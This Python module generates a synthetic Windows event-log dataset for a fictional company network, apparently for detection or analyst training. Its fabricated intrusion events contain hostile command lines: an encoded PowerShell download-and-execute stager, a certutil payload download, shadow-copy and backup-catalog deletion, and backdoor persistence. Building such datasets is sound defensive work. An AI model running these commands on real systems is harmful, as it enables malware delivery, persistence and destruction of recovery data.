"""Generate a synthetic, deterministic Windows event dataset.

The dataset covers a small company network (CORP) overnight, from 20:00 to
10:00 UTC. It mixes ordinary activity, internet noise against an exposed RDP
port and, unless ``attack=False``, two intrusions:

1. 02:10  Password spraying and guessing against WS-FIN-07's exposed RDP,
          a successful logon, an encoded PowerShell downloader, LSASS
          access, persistence (account, service, scheduled task),
          Kerberoasting against DC01, shadow-copy deletion on FS01 and a
          cleared Security log.
2. 09:14  A macro-enabled spreadsheet on WS-HR-03 starts cmd.exe and uses
          certutil to download a payload.

All addresses in the attack come from documentation ranges (RFC 5737) and
every event is fabricated. Nothing here is real telemetry.
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

SYSMON = "Microsoft-Windows-Sysmon/Operational"
POWERSHELL = "Microsoft-Windows-PowerShell/Operational"
SECURITY_PROVIDER = "Microsoft-Windows-Security-Auditing"

START = datetime(2026, 3, 13, 20, 0, tzinfo=timezone.utc)
END = datetime(2026, 3, 14, 10, 0, tzinfo=timezone.utc)

HOSTS = {
    "DC01.corp.local": {"ip": "10.0.10.5", "sysmon": False},
    "FS01.corp.local": {"ip": "10.0.10.20", "sysmon": False},
    "WS-FIN-07.corp.local": {"ip": "10.0.20.57", "sysmon": True, "user": "j.alvarez"},
    "WS-HR-03.corp.local": {"ip": "10.0.20.31", "sysmon": True, "user": "a.haddad"},
    "WS-ENG-12.corp.local": {"ip": "10.0.20.44", "sysmon": False, "user": "k.yamamoto"},
    "WS-ENG-15.corp.local": {"ip": "10.0.20.48", "sysmon": False, "user": "r.kowalski"},
}
WORKSTATIONS = [h for h, info in HOSTS.items() if "user" in info]
USERS = [
    "j.alvarez", "m.chen", "s.patel", "d.okafor", "l.nguyen", "r.kowalski", "a.haddad", "t.brooks",
    "e.rossi", "k.yamamoto", "p.mensah", "c.dubois", "n.ivanova", "b.ortiz", "h.larsen",
]
SERVICE_ACCOUNTS = ["svc_sql", "svc_iis", "svc_backup", "svc_sharepoint", "svc_scan", "svc_reporting", "svc_crm"]

ATTACKER_IP = "203.0.113.45"
STAGING_URL = "http://198.51.100.23"

_DEFENDER = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24010.12-0\MsMpEng.exe"
_POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
_CMD = r"C:\Windows\System32\cmd.exe"
_EXPLORER = r"C:\Windows\explorer.exe"
_EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
_OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"


class _Builder:
    def __init__(self, seed: int):
        self.rng = random.Random(seed)
        self.records: list[dict[str, Any]] = []
        self.record_ids = {host: 40_000 + i * 7_000 for i, host in enumerate(HOSTS)}

    def emit(self, when: datetime, host: str, channel: str, event_id: int, provider: str, **data: Any) -> None:
        self.record_ids[host] += 1
        ticks = self.rng.randrange(0, 10_000_000)
        stamp = when.strftime("%Y-%m-%dT%H:%M:%S") + f".{ticks:07d}Z"
        record = {
            "EventID": event_id,
            "TimeCreated": stamp,
            "Computer": host,
            "Channel": channel,
            "Provider": provider,
            "EventRecordID": self.record_ids[host],
        }
        record.update(data)
        self.records.append(record)

    # Security log helpers ------------------------------------------------

    def logon(self, when, host, user, logon_type, ip, workstation="-"):
        self.emit(when, host, "Security", 4624, SECURITY_PROVIDER,
                  TargetUserName=user, TargetDomainName="CORP", LogonType=str(logon_type),
                  IpAddress=ip, WorkstationName=workstation,
                  AuthenticationPackageName="Kerberos" if logon_type == 3 and ip.startswith("10.") else "Negotiate")

    def failed_logon(self, when, host, user, logon_type, ip, workstation="-", known=True):
        self.emit(when, host, "Security", 4625, SECURITY_PROVIDER,
                  TargetUserName=user, TargetDomainName="CORP", LogonType=str(logon_type),
                  IpAddress=ip, WorkstationName=workstation, Status="0xc000006d",
                  SubStatus="0xc000006a" if known else "0xc0000064")

    def process(self, when, host, user, image, command_line, parent):
        if HOSTS[host]["sysmon"]:
            self.emit(when, host, SYSMON, 1, "Microsoft-Windows-Sysmon",
                      UtcTime=when.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                      ProcessId=str(self.rng.randrange(1000, 20000)), Image=image, CommandLine=command_line,
                      User=f"CORP\\{user}" if user != "SYSTEM" else "NT AUTHORITY\\SYSTEM",
                      IntegrityLevel="Medium" if user != "SYSTEM" else "System",
                      Hashes="SHA256=" + "".join(self.rng.choice("0123456789ABCDEF") for _ in range(64)),
                      ParentImage=parent)
        else:
            self.emit(when, host, "Security", 4688, SECURITY_PROVIDER,
                      SubjectUserName=user if user != "SYSTEM" else host.split(".")[0] + "$",
                      SubjectDomainName="CORP", NewProcessId=hex(self.rng.randrange(0x1000, 0x9000)),
                      NewProcessName=image, CommandLine=command_line, ParentProcessName=parent,
                      TokenElevationType="%%1938")

    def script_block(self, when, host, text, path=""):
        self.emit(when, host, POWERSHELL, 4104, "Microsoft-Windows-PowerShell",
                  MessageNumber="1", MessageTotal="1", ScriptBlockText=text,
                  ScriptBlockId="{%08x-0000-4000-8000-%012x}" % (self.rng.getrandbits(32), self.rng.getrandbits(48)),
                  Path=path)

    def service_ticket(self, when, user, service, ip, encryption="0x12"):
        self.emit(when, "DC01.corp.local", "Security", 4769, SECURITY_PROVIDER,
                  TargetUserName=f"{user}@CORP.LOCAL", ServiceName=service, IpAddress=f"::ffff:{ip}",
                  TicketEncryptionType=encryption, TicketOptions="0x40810000", Status="0x0")


def _encoded(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


def _jitter(rng: random.Random, start: datetime, end: datetime) -> datetime:
    return start + timedelta(seconds=rng.uniform(0, (end - start).total_seconds()))


def _benign(b: _Builder) -> None:
    rng = b.rng
    # Workstation users: evening wrap-up and morning start.
    for host in WORKSTATIONS:
        user = HOSTS[host]["user"]
        ip = HOSTS[host]["ip"]
        for day_start, day_end in ((START, START + timedelta(hours=2)), (END - timedelta(hours=2, minutes=30), END)):
            first = _jitter(rng, day_start, day_start + timedelta(minutes=40))
            b.logon(first, host, user, 2, "127.0.0.1", host.split(".")[0])
            t = first
            while t < day_end:
                t += timedelta(minutes=rng.uniform(2, 9))
                b.logon(t, "FS01.corp.local", user, 3, ip)
                image, cmd, parent = rng.choice([
                    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
                    (_OUTLOOK, '"OUTLOOK.EXE"', _EXPLORER),
                    (_EXCEL, '"EXCEL.EXE" /dde', _EXPLORER),
                    (r"C:\Windows\System32\notepad.exe", r"notepad.exe C:\Users\Public\Documents\notes.txt", _EXPLORER),
                    (r"C:\Windows\splwow64.exe", "splwow64.exe 12288", _EXCEL),
                    (_CMD, "cmd.exe /c ipconfig /all", _EXPLORER),
                ])
                b.process(t + timedelta(seconds=2), host, user, image, cmd, parent)
                if rng.random() < 0.25:
                    b.service_ticket(t + timedelta(seconds=1), user, "FS01$", ip)
                if rng.random() < 0.12:
                    b.service_ticket(t + timedelta(seconds=3), user, rng.choice(["svc_sql", "svc_sharepoint", "svc_crm"]), ip)
            # A few mistyped passwords, never more than three in a row.
            if rng.random() < 0.6:
                t = _jitter(rng, day_start, day_end)
                for i in range(rng.randint(1, 3)):
                    b.failed_logon(t + timedelta(seconds=4 * i), "FS01.corp.local", user, 3, ip)
                b.logon(t + timedelta(seconds=15), "FS01.corp.local", user, 3, ip)

    # Other users touching the file server through the morning.
    t = END - timedelta(hours=2, minutes=10)
    while t < END:
        t += timedelta(seconds=rng.uniform(20, 120))
        b.logon(t, "FS01.corp.local", rng.choice(USERS), 3, f"10.0.20.{rng.randrange(60, 120)}")

    # Machine and server background activity all night.
    t = START
    while t < END:
        t += timedelta(minutes=rng.uniform(1, 3.5))
        server = rng.choice(["DC01.corp.local", "FS01.corp.local"])
        b.process(t, server, "SYSTEM", r"C:\Windows\System32\svchost.exe", r"svchost.exe -k netsvcs -p", r"C:\Windows\System32\services.exe")
        host = rng.choice(WORKSTATIONS)
        b.logon(t + timedelta(seconds=5), "DC01.corp.local", host.split(".")[0] + "$", 3, HOSTS[host]["ip"])
        if HOSTS[host]["sysmon"] and rng.random() < 0.3:
            b.emit(t + timedelta(seconds=9), host, SYSMON, 10, "Microsoft-Windows-Sysmon",
                   SourceImage=_DEFENDER, TargetImage=r"C:\Windows\system32\lsass.exe",
                   GrantedAccess="0x1410", SourceUser="NT AUTHORITY\\SYSTEM")
        if HOSTS[host]["sysmon"] and rng.random() < 0.2:
            b.emit(t + timedelta(seconds=12), host, SYSMON, 10, "Microsoft-Windows-Sysmon",
                   SourceImage=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                   GrantedAccess="0x1000", SourceUser="NT AUTHORITY\\SYSTEM")
        if rng.random() < 0.15:
            b.script_block(t + timedelta(seconds=20), rng.choice(WORKSTATIONS), rng.choice([
                "Get-Service | Where-Object { $_.Status -eq 'Stopped' } | Select-Object -First 5",
                "Get-ChildItem -Path C:\\Reports -Filter *.csv | Measure-Object",
                "Import-Module BitLocker; Get-BitLockerVolume -MountPoint C:",
                "$PSVersionTable.PSVersion",
            ]), path=r"C:\ProgramData\IT\Scripts\health.ps1")

    # Nightly IT maintenance.
    maintenance = START + timedelta(hours=3, minutes=5)
    b.process(maintenance, "FS01.corp.local", "SYSTEM", _POWERSHELL,
              r"powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\IT\Scripts\inventory.ps1",
              r"C:\Windows\System32\svchost.exe")
    b.emit(maintenance + timedelta(minutes=3), "WS-ENG-12.corp.local", "System", 7045, "Service Control Manager",
           ServiceName="Google Update Service (gupdate)",
           ImagePath='"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /svc',
           ServiceType="user mode service", StartType="auto start", AccountName="LocalSystem")
    b.emit(maintenance + timedelta(minutes=6), "FS01.corp.local", "Security", 4698, SECURITY_PROVIDER,
           TaskName="\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan", SubjectUserName="FS01$",
           TaskContent="<Exec><Command>%systemroot%\\system32\\usoclient.exe</Command><Arguments>StartScan</Arguments></Exec>")
    b.emit(maintenance + timedelta(minutes=8), "FS01.corp.local", "Security", 4698, SECURITY_PROVIDER,
           TaskName="\\Backup\\Nightly", SubjectUserName="h.larsen",
           TaskContent="<Exec><Command>C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Manager.exe</Command><Arguments>/backup</Arguments></Exec>")
    b.emit(END - timedelta(hours=1, minutes=12), "DC01.corp.local", "Security", 4732, SECURITY_PROVIDER,
           TargetUserName="Remote Desktop Users", MemberName="CN=Bianca Ortiz,OU=Staff,DC=corp,DC=local",
           MemberSid="S-1-5-21-3623811015-3361044348-30300820-1187", SubjectUserName="h.larsen")
    # A legacy scanner that still asks for RC4 tickets: one service, so no Kerberoasting alert.
    for hour in range(0, 14, 3):
        b.service_ticket(START + timedelta(hours=hour, minutes=17), "svc_scan", "svc_scan", "10.0.30.12", encryption="0x17")

    # Internet background noise against the exposed RDP port on WS-FIN-07.
    for octet in (14, 77, 102, 151, 203, 240):
        source = f"198.51.100.{octet}" if octet % 2 else f"192.0.2.{octet}"
        t = _jitter(rng, START, END)
        for i, name in enumerate(rng.sample(["administrator", "admin", "user", "test", "guest", "scanner"], rng.randint(2, 4))):
            b.failed_logon(t + timedelta(seconds=7 * i), "WS-FIN-07.corp.local", name, 3, source, "", known=False)


def _attack_rdp_intrusion(b: _Builder) -> None:
    rng = b.rng
    ws = "WS-FIN-07.corp.local"
    ws_ip = HOSTS[ws]["ip"]
    t = datetime(2026, 3, 14, 2, 10, 4, tzinfo=timezone.utc)

    # Password spraying: one guess per account.
    sprayed = ["administrator", "j.alvarez", "m.chen", "s.patel", "backup", "d.okafor", "l.nguyen", "helpdesk",
               "t.brooks", "e.rossi", "scanner", "p.mensah", "c.dubois", "n.ivanova"]
    for name in sprayed:
        b.failed_logon(t, ws, name, 3, ATTACKER_IP, "DESKTOP-R4F9TQ1", known=name in USERS)
        t += timedelta(seconds=rng.uniform(18, 40))
    # Guessing the one account that looked promising.
    t += timedelta(seconds=45)
    for _ in range(18):
        b.failed_logon(t, ws, "j.alvarez", 3, ATTACKER_IP, "DESKTOP-R4F9TQ1")
        t += timedelta(seconds=rng.uniform(9, 17))
    b.logon(t + timedelta(seconds=6), ws, "j.alvarez", 10, ATTACKER_IP, "DESKTOP-R4F9TQ1")

    # Execution: encoded PowerShell downloader.
    t = datetime(2026, 3, 14, 2, 26, 11, tzinfo=timezone.utc)
    stager = f"IEX (New-Object Net.WebClient).DownloadString('{STAGING_URL}/stage2.ps1')"
    b.process(t, ws, "j.alvarez", _POWERSHELL, f"powershell.exe -nop -w hidden -enc {_encoded(stager)}", _EXPLORER)
    b.script_block(t + timedelta(seconds=2), ws, stager)
    b.script_block(t + timedelta(seconds=9), ws,
                   f"$wc = New-Object Net.WebClient; $wc.DownloadFile('{STAGING_URL}/svc.exe', 'C:\\Users\\Public\\svc.exe')")
    b.process(t + timedelta(seconds=40), ws, "j.alvarez", r"C:\Users\Public\svc.exe", r"C:\Users\Public\svc.exe", _POWERSHELL)

    # Credential access: LSASS read.
    b.emit(datetime(2026, 3, 14, 2, 29, 37, tzinfo=timezone.utc), ws, SYSMON, 10, "Microsoft-Windows-Sysmon",
           SourceImage=r"C:\Users\Public\svc.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
           GrantedAccess="0x1010", SourceUser="CORP\\j.alvarez",
           CallTrace=r"C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Users\Public\svc.exe+1a2f3")

    # Persistence: backdoor account, service and scheduled task.
    t = datetime(2026, 3, 14, 2, 33, 2, tzinfo=timezone.utc)
    b.emit(t, ws, "Security", 4720, SECURITY_PROVIDER, TargetUserName="support_adm", TargetDomainName="WS-FIN-07",
           SubjectUserName="j.alvarez", SubjectDomainName="CORP")
    b.emit(t + timedelta(seconds=11), ws, "Security", 4732, SECURITY_PROVIDER, TargetUserName="Administrators",
           MemberName="-", MemberSid="S-1-5-21-1004336348-1177238915-682003330-1012",
           SubjectUserName="j.alvarez", SubjectDomainName="CORP")
    b.emit(t + timedelta(minutes=2, seconds=4), ws, "System", 7045, "Service Control Manager",
           ServiceName="WinUpdateSvc", ImagePath=r"%COMSPEC% /c C:\Users\Public\svc.exe",
           ServiceType="user mode service", StartType="auto start", AccountName="LocalSystem")
    b.emit(t + timedelta(minutes=3, seconds=30), ws, "Security", 4698, SECURITY_PROVIDER,
           TaskName="\\OneDrive Standalone Update", SubjectUserName="j.alvarez",
           TaskContent="<Exec><Command>powershell.exe</Command><Arguments>-w hidden -f C:\\Users\\Public\\u.ps1</Arguments></Exec>")

    # Credential access: Kerberoasting from the compromised workstation.
    t = datetime(2026, 3, 14, 2, 41, 15, tzinfo=timezone.utc)
    for account in SERVICE_ACCOUNTS:
        b.service_ticket(t, "j.alvarez", account, ws_ip, encryption="0x17")
        t += timedelta(seconds=rng.uniform(4, 12))

    # Lateral movement to the file server, then recovery inhibition.
    t = datetime(2026, 3, 14, 2, 52, 40, tzinfo=timezone.utc)
    b.logon(t, "FS01.corp.local", "j.alvarez", 3, ws_ip)
    b.process(t + timedelta(minutes=6), "FS01.corp.local", "j.alvarez", _CMD, "cmd.exe /c vssadmin.exe delete shadows /all /quiet", _EXPLORER)
    b.process(t + timedelta(minutes=6, seconds=1), "FS01.corp.local", "j.alvarez", r"C:\Windows\System32\vssadmin.exe",
              "vssadmin.exe  delete shadows /all /quiet", _CMD)
    b.process(t + timedelta(minutes=6, seconds=24), "FS01.corp.local", "j.alvarez", r"C:\Windows\System32\wbadmin.exe",
              "wbadmin.exe delete catalog -quiet", _CMD)

    # Defense evasion: clear the Security log on the way out.
    b.emit(datetime(2026, 3, 14, 3, 4, 51, tzinfo=timezone.utc), ws, "Security", 1102, "Microsoft-Windows-Eventlog",
           SubjectUserName="j.alvarez", SubjectDomainName="CORP")


def _attack_phishing(b: _Builder) -> None:
    ws = "WS-HR-03.corp.local"
    t = datetime(2026, 3, 14, 9, 14, 22, tzinfo=timezone.utc)
    b.process(t, ws, "a.haddad", _EXCEL,
              r'"EXCEL.EXE" "C:\Users\a.haddad\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q1_Bonus_Review.xlsm"', _OUTLOOK)
    command = rf"cmd.exe /c certutil.exe -urlcache -split -f {STAGING_URL}/inv.exe C:\Users\Public\inv.exe"
    b.process(t + timedelta(seconds=31), ws, "a.haddad", _CMD, command, _EXCEL)
    b.process(t + timedelta(seconds=32), ws, "a.haddad", r"C:\Windows\System32\certutil.exe",
              rf"certutil.exe -urlcache -split -f {STAGING_URL}/inv.exe C:\Users\Public\inv.exe", _CMD)


def generate(seed: int = 7, attack: bool = True) -> list[dict[str, Any]]:
    """Return the dataset as a list of flat event dictionaries, sorted by time."""
    builder = _Builder(seed)
    _benign(builder)
    if attack:
        _attack_rdp_intrusion(builder)
        _attack_phishing(builder)
    builder.records.sort(key=lambda r: r["TimeCreated"])
    return builder.records


def write_jsonl(records: list[dict[str, Any]], path: str | Path) -> Path:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="\n") as handle:
        for record in records:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")
    return path
